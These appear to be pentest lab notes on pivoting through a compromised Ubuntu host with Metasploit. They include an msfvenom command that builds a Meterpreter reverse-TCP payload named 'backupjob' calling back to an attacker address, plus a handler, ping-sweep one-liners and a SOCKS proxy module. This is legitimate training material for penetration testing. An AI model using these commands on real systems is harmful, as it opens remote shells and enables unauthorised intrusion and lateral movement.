**Overview:**
Now let us consider a scenario where we have our Meterpreter shell access on the Ubuntu server (the pivot host), and we want to perform enumeration scans through the pivot host, but we would like to take advantage of the conveniences that Meterpreter sessions bring us. In such cases, we can still create a pivot with our Meterpreter session without relying on SSH port forwarding

```
use exploit/multi/handler
```

Payload generation
```
 msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
```
generate the payload andsend the payload on the target host through the ssh session
execute it.


```
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```
perform a ping sweep on the network

```
for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
```
ping sweep from bash
```
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
```
ping sweep from cmd

```
 use auxiliary/server/socks_proxy
```

